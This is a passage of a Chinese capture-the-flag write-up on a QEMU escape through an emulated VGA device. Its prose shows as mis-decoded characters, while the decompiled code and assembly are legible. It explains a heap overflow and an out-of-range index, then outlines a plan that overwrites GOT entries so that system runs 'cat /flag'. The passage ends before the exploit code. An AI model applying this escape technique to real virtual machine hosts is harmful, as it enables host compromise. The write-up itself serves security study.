class="number">0x1000</span>u )</span><br><span class="line">        *((_QWORD *)v20 + <span class="number">9852</span>) = (<span class="keyword">unsigned</span> __int16)mem_value;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é€†å‘ä¹‹åä¼šå‘ç°è¿™é‡Œå…¶å®å°±æ˜¯ä¸€ä¸ªå †é¢˜ï¼Œæ€»å…±æœ‰äº”ä¸ªé€‰é¡¹</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">v5==<span class="number">0</span>æ—¶ï¼Œopaque-&gt;vs[idx].buf = <span class="built_in">malloc</span>(mem_value &amp; <span class="number">0xfff</span>); max_size == mem_value &amp; <span class="number">0xfff</span></span><br><span class="line">v5==<span class="number">1</span>æ—¶ï¼Œå½“cur_size &lt; max_sizeæ—¶ï¼Œopaque-&gt;vs[idx].buf[cur_size++] = mem_value &amp; <span class="number">0xff</span></span><br><span class="line">v5==<span class="number">2</span>æ—¶ï¼Œprintf_chk(<span class="number">1</span>, opaque-&gt;vs[idx].buf)</span><br><span class="line">v5==<span class="number">3</span>æ—¶ï¼Œopaque-&gt;vs[idx].max_size = mem_value &amp; <span class="number">0xfff</span></span><br><span class="line">v5==<span class="number">4</span>æ—¶ï¼Œopaque-&gt;vs[idx].buf[cur_size++] = mem_value &amp; <span class="number">0xff</span></span><br></pre></td></tr></table></figure><p>éœ€è¦åæ§½çš„æ˜¯ï¼Œè¿™ä¸¤æ¬¡æ±‡ç¼–è¯­è¨€è¡¨è¾¾çš„æ„æ€ä¸€æ ·ä½†æ˜¯è¡¨è¾¾çš„å½¢å¼ä¸ä¸€æ ·ï¼Œæ‰€ä»¥è«åå…¶å¦™çš„éœ€è¦ä¾é æ±‡ç¼–æ¥é€†å‘ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000068F521 48 81 C2 3D 13 00 00          add     rdx, 133Dh</span><br><span class="line">.text:000000000068F528 48 C1 E2 04                   shl     rdx, 4</span><br><span class="line">.text:000000000068F52C 48 8B 74 13 08                mov     rsi, [s+rdx+8]</span><br><span class="line">.text:000000000068F531 48 85 F6                      test    rsi, rsi</span><br><span class="line">.text:000000000068F534 0F 84 24 FD FF FF             jz      loc_68F25E</span><br><span class="line">.text:000000000068F534</span><br><span class="line">.text:000000000068F53A 48 83 C4 18                   add     rsp, 18h</span><br><span class="line">.text:000000000068F53E BF 01 00 00 00                mov     edi, 1</span><br><span class="line">.text:000000000068F543 31 C0                         xor     eax, eax</span><br><span class="line">.text:000000000068F545 5B                            pop     s</span><br><span class="line">.text:000000000068F546 5D                            pop     rbp</span><br><span class="line">.text:000000000068F547 E9 F4 99 D7 FF                jmp     ___printf_chk</span><br><span class="line"></span><br><span class="line">Â·Â·Â·Â·Â·Â·</span><br><span class="line"></span><br><span class="line">.text:000000000068F47B 48 89 E9                      mov     rcx, rbp</span><br><span class="line">.text:000000000068F47E 48 C1 E1 04                   shl     rcx, 4</span><br><span class="line">.text:000000000068F482 48 01 CB                      add     s, rcx</span><br><span class="line">.text:000000000068F485 48 85 C0                      test    rax, rax</span><br><span class="line">.text:000000000068F488 48 89 83 D8 33 01 00          mov     [rbx+133D8h], rax</span><br><span class="line">.text:000000000068F48F 0F 84 C9 FD FF FF             jz      loc_68F25E</span><br><span class="line">.text:000000000068F48F</span><br><span class="line">.text:000000000068F495 48 8B 54 24 08                mov     rdx, qword ptr [rsp+28h+chunk_size]</span><br><span class="line">.text:000000000068F49A 48 83 C5 01                   add     rbp, 1</span><br><span class="line">.text:000000000068F49E 48 89 2D 3B A0 A3 00          mov     cs:vulncnt, rbp</span><br><span class="line">.text:000000000068F4A5 81 E2 FF FF 00 00             and     edx, 0FFFFh</span><br><span class="line">.text:000000000068F4AB 89 93 E0 33 01 00             mov     [rbx+133E0h], edx</span><br><span class="line">.text:000000000068F4B1 E9 A8 FD FF FF                jmp     loc_68F25E</span><br></pre></td></tr></table></figure><p>ä¸Šé¢å¯ä»¥çœ‹åˆ°æ¼æ´ç‚¹æ˜¯<code>v5 == 4</code>æ—¶ï¼Œå¯¹<code>cur_size</code>æ²¡æœ‰æ£€æµ‹ï¼Œå¯ä»¥å®ç°å †æº¢å‡ºï¼Œå½“ç„¶æˆ‘æ„Ÿè§‰ä¸‰å¯ä»¥ä¿®æ”¹æœ€å¤§sizeé…åˆäºŒä¹Ÿæ˜¯å¯ä»¥å®ç°å †æº¢å‡ºï¼Œä½†æ˜¯ç›´æ¥ç”¨å››å³å¯å®ç°æ‰€ä»¥ä¹Ÿæ²¡å¿…è¦å†å»æä¸‰äºŒäº†ã€‚</p><p>å†å°±æ˜¯å­˜åœ¨ä¸€ä¸ªå¤§çš„é—®é¢˜å°±æ˜¯ï¼Œä¸Šé¢æ‰€æœ‰å¯¹idxçš„éªŒè¯å°±æ˜¯å°äºç­‰äº16ï¼Œæ‰€ä»¥è¿™ä¸€å‡ºä¹Ÿå°±å¯¼è‡´æˆ‘ä»¬å¯ä»¥æº¢å‡ºåˆ°ä¸‹ä¸€ä¸ªæˆå‘˜<code>latch</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint64_t</span> __fastcall <span class="title">cydf_vga_mem_read</span><span class="params">(CydfVGAState *opaque, hwaddr addr, <span class="keyword">uint32_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">uint32_t</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">bool</span> v4; <span class="comment">// zf</span></span><br><span class="line">  <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> *v6; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v7; <span class="comment">// edx</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  v3 = opaque-&gt;latch[<span class="number">0</span>];</span><br><span class="line">  <span class="keyword">if</span> ( !(_WORD)v3 )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (opaque-&gt;vga.sr[<span class="number">7</span>] &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">    opaque-&gt;latch[<span class="number">0</span>] = addr | v3;</span><br><span class="line">    <span class="keyword">if</span> ( !v4 )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_3;</span><br><span class="line">    <span class="keyword">return</span> vga_mem_readb(&amp;opaque-&gt;vga, addr);</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = (opaque-&gt;vga.sr[<span class="number">7</span>] &amp; <span class="number">1</span>) == <span class="number">0</span>;</span><br><span class="line">  opaque-&gt;latch[<span class="number">0</span>] = (_DWORD)addr &lt;&lt; <span class="number">16</span>;</span><br><span class="line">  <span class="keyword">if</span> ( v4 )</span><br><span class="line">    <span class="keyword">return</span> vga_mem_readb(&amp;opaque-&gt;vga, addr);</span><br><span class="line">LABEL_3:</span><br><span class="line">  <span class="keyword">if</span> ( addr &gt; <span class="number">0xFFFF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">255LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( addr - <span class="number">0x18000</span> &lt;= <span class="number">0xFF</span> &amp;&amp; (opaque-&gt;vga.sr[<span class="number">23</span>] &amp; <span class="number">0x44</span>) == <span class="number">4</span> )</span><br><span class="line">      <span class="keyword">return</span> cydf_mmio_blt_read(opaque, (<span class="keyword">unsigned</span> __int8)addr);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    result = <span class="number">0xFF</span>LL;</span><br><span class="line">    v6 = (<span class="keyword">char</span> *)opaque + <span class="number">4</span> * (addr &gt;&gt; <span class="number">15</span>);</span><br><span class="line">    v7 = addr &amp; <span class="number">0x7FFF</span>;</span><br><span class="line">    <span class="keyword">if</span> ( v7 &lt; *((_DWORD *)v6 + <span class="number">0x44D5</span>) )</span><br><span class="line">    &#123;</span><br><span class="line">      v8 = *((_DWORD *)v6 + <span class="number">0x44D3</span>) + v7;</span><br><span class="line">      <span class="keyword">if</span> ( (opaque-&gt;vga.gr[<span class="number">11</span>] &amp; <span class="number">0x14</span>) == <span class="number">20</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 *= <span class="number">16</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( (opaque-&gt;vga.gr[<span class="number">11</span>] &amp; <span class="number">2</span>) != <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v8 *= <span class="number">8</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">return</span> opaque-&gt;vga.vram_ptr[opaque-&gt;cydf_addr_mask &amp; v8];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨è¿™ä¸ªå‡½æ•°ä¸­å…¶å®æ˜¯å¯ä»¥æ§åˆ¶<code>latch[0]</code>çš„å€¼çš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> ( (<span class="keyword">char</span>)sr_index )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">    opaque-&gt;vga.sr[(<span class="keyword">unsigned</span> __int8)sr_index] = sr_mask[(<span class="keyword">unsigned</span> __int8)sr_index] &amp; v4;</span><br><span class="line">    <span class="keyword">if</span> ( (_BYTE)sr_index == <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_35;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">    opaque-&gt;vga.sr[<span class="number">6</span>] = <span class="number">3</span> * ((v4 &amp; <span class="number">0x17</span>) == <span class="number">18</span>) + <span class="number">15</span>;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">    cydf_update_memory_access(opaque);</span><br><span class="line">    sr_index = opaque-&gt;vga.sr_index;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_28;</span><br><span class="line">  <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xA</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xB</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xC</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xD</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xE</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xF</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x13</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x14</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x15</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x16</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x18</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x19</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1A</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1B</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1C</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1D</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1E</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0x1F</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xCC</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xCD</span>:</span><br><span class="line">  <span class="keyword">case</span> <span class="number">0xCE</span>:</span><br><span class="line">    LABEL_28:</span><br><span class="line">    opaque-&gt;vga.sr[sr_index] = v4;</span><br><span class="line">    <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è€Œåœ¨è¿™é‡Œæˆ‘ä»¬æ­£å¥½å¯ä»¥æ§åˆ¶<code>opaque-&gt;vga.sr[0xCC]</code>çš„å€¼ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">qemu_log</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *fmt, ...)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v1; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v2; <span class="comment">// rcx</span></span><br><span class="line">  __int64 v3; <span class="comment">// rsi</span></span><br><span class="line">  __int64 v4; <span class="comment">// r8</span></span><br><span class="line">  __int64 v5; <span class="comment">// r9</span></span><br><span class="line">  <span class="keyword">int</span> ret; <span class="comment">// [rsp+1Ch] [rbp-D4h]</span></span><br><span class="line">  gcc_va_list va; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v9; <span class="comment">// [rsp+38h] [rbp-B8h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+48h] [rbp-A8h]</span></span><br><span class="line">  __int64 v11; <span class="comment">// [rsp+50h] [rbp-A0h]</span></span><br><span class="line">  __int64 v12; <span class="comment">// [rsp+58h] [rbp-98h]</span></span><br><span class="line">  __int64 v13; <span class="comment">// [rsp+60h] [rbp-90h]</span></span><br><span class="line">  __int64 v14; <span class="comment">// [rsp+68h] [rbp-88h]</span></span><br><span class="line"></span><br><span class="line">  va_start(va, fmt);</span><br><span class="line">  v3 = va_arg(va, _QWORD);</span><br><span class="line">  v1 = va_arg(va, _QWORD);</span><br><span class="line">  v2 = va_arg(va, _QWORD);</span><br><span class="line">  v4 = va_arg(va, _QWORD);</span><br><span class="line">  v5 = va_arg(va, _QWORD);</span><br><span class="line">  va_end(va);</span><br><span class="line">  v10 = v3;</span><br><span class="line">  v11 = v1;</span><br><span class="line">  v12 = v2;</span><br><span class="line">  v13 = v4;</span><br><span class="line">  v14 = v5;</span><br><span class="line">  v9 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  ret = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( qemu_logfile )</span><br><span class="line">  &#123;</span><br><span class="line">    va_start(va, fmt);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    va_arg(va, _QWORD);</span><br><span class="line">    ret = <span class="built_in">vfprintf</span>(qemu_logfile, fmt, va);</span><br><span class="line">    <span class="keyword">if</span> ( ret &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨<code>qemu_log</code>å‡½æ•°ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ª<code>vfprintf</code>å‡½æ•°è°ƒç”¨äº†bssä¸Šçš„ä¸€ä¸ªå˜é‡<code>qemu_logfile</code>ã€‚é‚£ä¹ˆåˆ©ç”¨æ€è·¯å¦‚ä¸‹ï¼š</p><ol><li>  ä¿®æ”¹qemu_logfileçš„å†…å®¹ä¸º<code>cat /flag</code></li><li>  ä¿®æ”¹vfprintfå‡½æ•°çš„gotè¡¨ä¸ºsystem</li><li>  ä¿®æ”¹printf_chkå‡½æ•°çš„gotè¡¨ä¸ºqemu_log</li><li>  æœ€åè®©v5ç­‰äº2ï¼Œè§¦å‘printf_chk</li></ol><h2 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h2><p>å…ˆåæ§½ä¸€ç‚¹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">switch ( addr )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">case</span> 4uLL:</span><br><span class="line">  <span class="keyword">case</span> 0x24uLL:</span><br><span class="line">  opaque-&gt;vga.cr_index = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 5uLL:</span><br><span class="line">  <span class="keyword">case</span> 0x25uLL:</span><br><span class="line">  cr_index = opaque-&gt;vga.cr_index;</span><br><span class="line">  <span class="keyword">if</span> ( (unsigned __int8)cr_index &lt;= 0x18u )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">if</span> ( (opaque-&gt;vga.cr[17] &amp; 0x80u) == 0 || (unsigned __int8)cr_index &gt; 7u )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[(unsigned __int8)cr_index] = value;</span><br><span class="line">  <span class="keyword">if</span> ( (_BYTE)cr_index != 24 &amp;&amp; ((1LL &lt;&lt; <span class="string">cr_index) &amp; 0x8200F1) != 0 )</span></span><br><span class="line"><span class="string">  LABEL_35:</span></span><br><span class="line"><span class="string">  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);</span></span><br><span class="line"><span class="string">  &#125;</span></span><br><span class="line"><span class="string">  else if ( (_BYTE)cr_index</span> == 7 )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[7] = value &amp; 0x10 | opaque-&gt;vga.cr[7] &amp; 0xEF;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( (unsigned __int8)cr_index &lt;= 0x1Du )</span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.cr[cr_index] = value;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0xAuLL:</span><br><span class="line">  <span class="keyword">case</span> 0x2AuLL:</span><br><span class="line">  opaque-&gt;vga.fcr = value &amp; 0x10;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x10uLL:</span><br><span class="line">  ar_flip_flop = opaque-&gt;vga.ar_flip_flop;</span><br><span class="line">  <span class="keyword">if</span> ( ar_flip_flop )</span><br><span class="line">  &#123;</span><br><span class="line">  v13 = opaque-&gt;vga.ar_index &amp; 0x1F;</span><br><span class="line">  switch ( opaque-&gt;vga.ar_index &amp; 0x1F )</span><br><span class="line">  &#123;</span><br><span class="line">  <span class="keyword">case</span> 0:</span><br><span class="line">  <span class="keyword">case</span> 1:</span><br><span class="line">  <span class="keyword">case</span> 2:</span><br><span class="line">  <span class="keyword">case</span> 3:</span><br><span class="line">  <span class="keyword">case</span> 4:</span><br><span class="line">  <span class="keyword">case</span> 5:</span><br><span class="line">  <span class="keyword">case</span> 6:</span><br><span class="line">  <span class="keyword">case</span> 7:</span><br><span class="line">  <span class="keyword">case</span> 8:</span><br><span class="line">  <span class="keyword">case</span> 9:</span><br><span class="line">  <span class="keyword">case</span> 0xA:</span><br><span class="line">  <span class="keyword">case</span> 0xB:</span><br><span class="line">  <span class="keyword">case</span> 0xC:</span><br><span class="line">  <span class="keyword">case</span> 0xD:</span><br><span class="line">  <span class="keyword">case</span> 0xE:</span><br><span class="line">  <span class="keyword">case</span> 0xF:</span><br><span class="line">  <span class="keyword">case</span> 0x12:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value &amp; 0x3F;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x10:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value &amp; 0xEF;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x11:</span><br><span class="line">  goto LABEL_42;</span><br><span class="line">  <span class="keyword">case</span> 0x13:</span><br><span class="line">  <span class="keyword">case</span> 0x14:</span><br><span class="line">  LOBYTE(value) = value &amp; 0xF;</span><br><span class="line">  LABEL_42:</span><br><span class="line">  opaque-&gt;vga.ar[v13] = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  default:</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">  opaque-&gt;vga.ar_index = value &amp; 0x3F;</span><br><span class="line">  &#125;</span><br><span class="line">  opaque-&gt;vga.ar_flip_flop = ar_flip_flop ^ 1;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x12uLL:</span><br><span class="line">  opaque-&gt;vga.msr = value &amp; 0xEF;</span><br><span class="line">  opaque-&gt;vga.update_retrace_info((VGACommonState *)opaque);</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  <span class="keyword">case</span> 0x14uLL:</span><br><span class="line">  opaque-&gt;vga.sr_index = value;</span><br><span class="line">  <span class="built_in">break</span>;</span><br><span class="line">  ... ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç€ç‹—å±idaç¿»è¯‘çš„æ˜¯0x14</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:000000000068F5F6 48 81 EB B4 03 00 00          sub     addr, 3B4h                      ; switch 39 cases</span><br><span class="line">.text:000000000068F5FD 48 83 FB 26                   cmp     rbx, 26h</span><br><span class="line">.text:000000000068F601 77 C1                         ja      short def_68F603                ; jumptable 000000000068F603 default case, cases 950-953,955-959,961,963,970-973,976-979,982-985</span><br><span class="line">.text:000000000068F601                                                                       ; jumptable 000000000068F792 default case, cases 5,32-47,50-79,82-111,114-143,146-175,178-203,207,210-239</span><br><span class="line">.text:000000000068F601</span><br><span class="line">.text:000000000068F603 FF 24 DD 78 8E A9 00          jmp     ds:jpt_68F603[rbx*8]            ; switch jump</span><br></pre></td></tr></table></figure><p> åœ¨è¿™é‡Œæ˜¯å‡å»0x3B4</p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230315161250131.png"                      alt="image-20230315161250131"                ></p><p>ä½†æ˜¯è¿™é‡ŒçœŸæ­£éœ€è¦çš„æ˜¯0x10ï¼Œåˆä¸€æ¬¡ç¿»è¯‘é”™è¯¯ã€‚</p><p>å¿½ç•¥è¿™äº›å°é”™è¯¯ä¹‹åç›´æ¥ç¼–å†™expå³å¯</p><h3 id="ç»¼ä¸Šï¼Œå¯å¾—exp"><a href="#ç»¼ä¸Šï¼Œå¯å¾—exp" class="headerlink" title="ç»¼ä¸Šï¼Œå¯å¾—exp"></a>ç»¼ä¸Šï¼Œå¯å¾—exp</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 